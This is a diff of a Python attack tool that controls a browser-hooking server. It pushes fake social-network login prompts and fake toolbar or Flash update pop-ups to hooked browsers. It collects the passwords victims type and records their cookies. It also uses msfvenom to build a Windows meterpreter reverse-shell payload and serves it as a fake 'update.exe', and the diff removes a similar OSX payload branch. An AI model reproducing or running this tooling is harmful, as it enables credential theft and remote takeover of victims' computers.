@@ -23,9 +23,10 @@ class Browser_Parser:
 		self.browser_id = None
 		self.cert = (self.cert_cert, self.cert_key)
 		self.api_key = self.get_api_key()
-		self.login_promt_id = None
+		self.login_prompt_id = 0
 		self.account = None
-		self.toolbar_prompt_id = None
+		self.toolbar_prompt_id = 0
+		self.flash_prompt_id = 0
 		self.interface = MITM_Interface(self.user_id)
 		self.lhost = self.get_my_ip()
 		self.lport = "4444"
@@ -46,7 +47,7 @@ class Browser_Parser:
 		return str(ifconfig[0][0])
 
 	def promt_fake_login(self):
-		#if self.login_promt_id is None: ./RAP.sh st
+		#if self.login_prompt_id is None: ./RAP.sh st
 		socnet_choice= raw_input("fake login to send:")
 		if socnet_choice.lower() == 'facebook':
 			socnet_choice, self.account = 'Facebook','facebook'
@@ -66,8 +67,8 @@ class Browser_Parser:
 		if k_dict['success'] == "true":
 			print "successfully sent prompt..."
 			print "command id:" + str(k_dict['command_id'])
-			self.login_promt_id = k_dict['command_id']
-			self.browser_db_router.update_BrowserTable_Login_Cmd(self.user_id, self.login_promt_id)
+			self.login_prompt_id = k_dict['command_id']
+			self.browser_db_router.update_BrowserTable_Login_Cmd(self.user_id, self.login_prompt_id)
 		else:
 			print "prompt request unsucessful"
 			return None
@@ -81,8 +82,8 @@ class Browser_Parser:
 		if k_dict['success'] == "true":
 			print "successfully sent prompt..."
 			print "command id:" + str(k_dict['command_id'])
-			self.login_promt_id = k_dict['command_id']
-			self.browser_db_router.update_BrowserTable_Login_Cmd(self.user_id, self.login_promt_id)
+			self.login_prompt_id = k_dict['command_id']
+			self.browser_db_router.update_BrowserTable_Login_Cmd(self.user_id, self.login_prompt_id)
 		else:
 			print "prompt request unsucessful"
 			return None
@@ -101,8 +102,8 @@ class Browser_Parser:
 		if to_b['success'] == "true":
 			print "fake flash pop-up sent..."
 			print 'command_id:' + str(to_b['command_id'])
-			self.toolbar_prompt_id = 249
-			self.browser_db_router.update_BrowserTable_Toolbar_Cmd(self.user_id, str(to_b['command_id']))
+			self.flash_prompt_id = 249
+			self.browser_db_router.update_BrowserTable_Flash_Cmd(self.user_id, str(to_b['command_id']))
 		else:
 			print "prompt request unsucessful"
 			return None
@@ -122,24 +123,19 @@ class Browser_Parser:
 	def make_meterpreter_payload(self, operating_system):
 		'''
 			android: android/meterpreter/reverse_tcp 
-				   payload/osx/armle/shell_reverse_tcp  
+			   payload/osx/armle/shell_reverse_tcp  
 			windows : windows/meterpreter/reverse_tcp
 			mac : osx/x86/shell_reverse_tcp    
+				payload/osx/ppc/shell/reverse_tcp  
+
 		'''
 		if operating_system.lower() == "windows":
 			print "creating windows payload..."
 			os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost=" + self.lhost + " lport=" + self.lport + " -f exe -o /var/www/html/update.exe")
 			self.exploit = "https://192.168.3.1/update.exe"
-		elif operating_system.lower() == "osx":
-			print "creating OSX payload..."
-			os.system("msfvenom -p osx/x86/shell_reverse_tcp lhost=" + self.lhost + " lport=" + self.lport + " -f dmg -o /var/www/html/update.dmg")
-			self.exploit = "https://192.168.3.1/update.dmg"
-		elif operating_system.loweR() == "android":
-			print "creating android payload..."
-
-		
-
-
+		else:	
+			print "please supply OS"
+			pass
 
 	def fake_toolbar(self, redirect_url):
 		if self.browser_id is None:
@@ -154,7 +150,7 @@ class Browser_Parser:
 			notification = "Additional plugins are required to display all the media on this page."
 		elif toolbar_type.lower() == 'ie':
 			command_id = 263
-			notification = "This website wants to run the following applet: 'Java' from 'Microsoft Inc'. To continue using this website you must accept the following security popup"
+			notification = "This website wants to run the following applet: 'Java' from 'Microsoft Inc'. To continue using this website you must accept the following security popup" #microsoft java 2017
 		else:
 			print 'please give a valid choice'
 			return None
@@ -185,14 +181,14 @@ class Browser_Parser:
 			+ str(self.api_key), cert = self.cert, verify=False)
 		c_dict = json.loads(dets.text)
 		try:
-			pprint.pprint(c_dict)
+			#pprint.pprint(c_dict)
 			data = json.loads(c_dict['0']['data'])
 			if not account.lower() == 'google':
 				password = str(data['data']).split(":")[1]
 			else:
 				password = str(data['data']).split(":")[2]
 			self.interface.read_traffic(account, password)
-			print password
+			#print password
 			return self.browser_db_router.update_BrowserTable_Login(self.user_id, 1)
 		except KeyError:
 			print("did not get response yet")
@@ -201,7 +197,7 @@ class Browser_Parser:
 
 	def get_toolbar_result(self):
 		#if toolbar prompt id is none, return
-		if self.toolbar_prompt_id is not None:
+		if self.toolbar_prompt_id != 0:
 			idee = self.browser_db_router.get_browser_toolbar_cmd(self.user_id)
 			print str(idee)
 			self.browser_id = self.browser_db_router.get_browser_session_id(self.user_id)
@@ -217,20 +213,42 @@ class Browser_Parser:
 			try:
 				if c_dict['1']:
 					print "user has clicked on the toolbar"
-					self.toolbar_prompt_id = None
+					self.toolbar_prompt_id = 0
 					return self.browser_db_router.update_BrowserTable_Toolbar(self.user_id, 1)
 			except KeyError as ke:
-				try:
-					if c_dict['0']:
-						print "user has clicked on false flash pop-up"
-						self.toolbar_prompt_id = None
-						return self.browser_db_router.update_BrowserTable_Toolbar(self.user_id, 1)
-				except KeyError as ke:
-					print "user has not clicked on toolbar"
-					return self.browser_db_router.update_BrowserTable_Toolbar(self.user_id, 0)
+				print "user has not clicked on toolbar yet"
+				self.browser_db_router.update_BrowserTable_Toolbar(self.user_id, 0)
 		else:
 			print "plz issue toolbar cmd first"
 			pass
+
+	def get_flash_result(self):
+		#if toolbar prompt id is none, return
+		if self.flash_prompt_id != 0:
+			idee = self.browser_db_router.get_browser_flash_cmd(self.user_id)
+			print str(idee)
+			self.browser_id = self.browser_db_router.get_browser_session_id(self.user_id)
+			print str(self.browser_id)
+			print(str("toolbar_prompt_id:" + str(self.flash_prompt_id)))
+			dets = requests.get(url='https://192.168.3.1:3000/api/modules/'
+				+ str(self.browser_id)
+				+ '/' + str(self.flash_prompt_id) + '/' + str(idee)
+				+"?token="
+				+str(self.api_key), cert=self.cert, verify=False)
+			c_dict= json.loads(dets.text)
+			print c_dict
+			try:
+				if c_dict['0']:
+					print "user has clicked on false flash pop-up"
+					self.flash_prompt_id = 0
+					return self.browser_db_router.update_BrowserTable_Flash(self.user_id, 1)
+			except KeyError as ke:
+				print "user has not clicked on toolbar or flash pop-up"
+				self.browser_db_router.update_BrowserTable_Flash(self.user_id, 0)
+		else:
+			print "plz issue flash cmd first"
+			pass
+
 
 	def get_hooked_browsers(self):
 		hooked_browsers = {}
@@ -257,14 +275,23 @@ class Browser_Parser:
 			return None
 
 	def get_browser_deets(self, browser_id):
+		'''
+		(self, 
+		user_id, hooked_browser_id, browser_name, 
+		browser_version, os, os_version, browser_plugins, session_id, 
+		login_cmd, toolbar_cmd, flash_cmd,  
+		redirect_uri, has_activex_enabled,
+		has_VBS_enabled,has_flash_enabled, has_quicktime_enabled, cookies):
+		'''
 		urll = 'https://192.168.3.1:3000/api/hooks/' + str(browser_id) + "?token=" + str(self.api_key)
 		k_une = requests.get(url=urll, cert=self.cert, verify=False)
 		k_dict = json.loads(k_une.text)
 		pprint.pprint(k_dict)
-		self.browser_db_router.insert_into_BrowserTable(self.user_id, browser_id, k_dict['BrowserReportedName'], k_dict['BrowserVersion'], k_dict['OsName'], k_dict['BrowserPlugins'], self.browser_id, '0', '0', k_dict['PageURI'])
+		self.browser_db_router.insert_into_BrowserTable(self.user_id, browser_id, k_dict['BrowserReportedName'], k_dict['BrowserVersion'], k_dict['OsName'], k_dict['OsVersion'], k_dict['BrowserPlugins'], self.browser_id, k_dict['PageURI'], str(self.login_prompt_id), str(self.toolbar_prompt_id), str(self.flash_prompt_id), k_dict['HasActiveX'], k_dict['VBScriptEnabled'], k_dict['HasFlash'], k_dict['HasQuickTime'], k_dict['Cookies'] )
 
 
 	def get_module_deets(self):
+		#debug: helper to get details on modules, delete after use
 		det = requests.get(url="https://192.168.3.1:3000/api/modules/266?token=" + str(self.api_key), cert=self.cert, verify=False)
 		pprint.pprint(json.loads(det.text)) 
 		# 242 --> pretty theft, 252 --> firefox fake notification, 256 --> chrome fake bar, 263 --> IE fake bar
@@ -280,9 +307,10 @@ class Browser_Parser:
 								"3.Display fake toolbar\n"\
 								"4.Save fake login results\n"\
 								"5.Save fake toolbar results\n"\
-								"6.Gmail theft\n"\
-								"7.Flash pop-up\n"\
-								"8.exit\n")
+								"6.Save fake flash results\n"\
+								"7.Gmail theft\n"\
+								"8.Flash pop-up\n"\
+								"9.exit\n")
 				try:
 					resp = int(resp)
 				except ValueError:
@@ -310,12 +338,15 @@ class Browser_Parser:
 				self.get_toolbar_result()
 				self.menu()
 			elif resp == 6:
-				self.prompt_gmail_login()
+				self.get_flash_result()
 				self.menu()
 			elif resp == 7:
-				self.fake_flash_update(self.redirect_url)
+				self.prompt_gmail_login()
 				self.menu()
 			elif resp == 8:
+				self.fake_flash_update(self.redirect_url)
+				self.menu()
+			elif resp == 9:
 				sys.exit()
 			elif resp == 666:
 				rusure = raw_input("[!] ARE YOU SURE YOU WANT TO DO THIS?")
